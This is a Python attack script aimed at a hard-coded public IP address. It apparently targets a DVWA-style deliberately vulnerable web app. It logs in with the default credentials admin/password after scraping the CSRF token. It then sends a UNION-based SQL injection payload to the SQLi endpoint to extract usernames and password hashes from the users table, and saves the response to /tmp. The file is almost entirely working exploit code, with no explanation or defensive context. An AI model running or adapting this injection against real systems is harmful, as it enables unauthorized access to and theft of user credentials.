
import requests
import re
import urllib.parse

url = "http://31.97.117.123/"
session = requests.Session()

# Login first
response = session.get(f"{url}login.php")
token_match = re.search(r"user_token'\s+value='([a-f0-9]+)'", response.text)
csrf_token = token_match.group(1)

login_data = {
    "username": "admin",
    "password": "password",
    "user_token": csrf_token,
    "Login": "Login"
}

session.post(f"{url}login.php", data=login_data)

# SQLi payload to get all users
payload = "1' UNION SELECT user_id, first_name, last_name, user, password FROM users WHERE '1'='1"
encoded_payload = urllib.parse.quote(payload)

response = session.get(f"{url}vulnerabilities/sqli/?id={encoded_payload}&Submit=Submit")

# Save the full response to see the structure
with open("/tmp/sqli_response.html", "w") as f:
    f.write(response.text)

print("[+] Response saved to /tmp/sqli_response.html")
print(f"[+] Total response length: {len(response.text)} bytes")

# Look for specific patterns
if "ID:" in response.text:
    print("\n[+] Found 'ID:' in response")
    # Find a section containing ID data
    id_section = re.search(r'ID:.*?(?=<br|<p|<div)', response.text, re.DOTALL)
    if id_section:
        print("Sample section:")
        print(id_section.group(0)[:500])

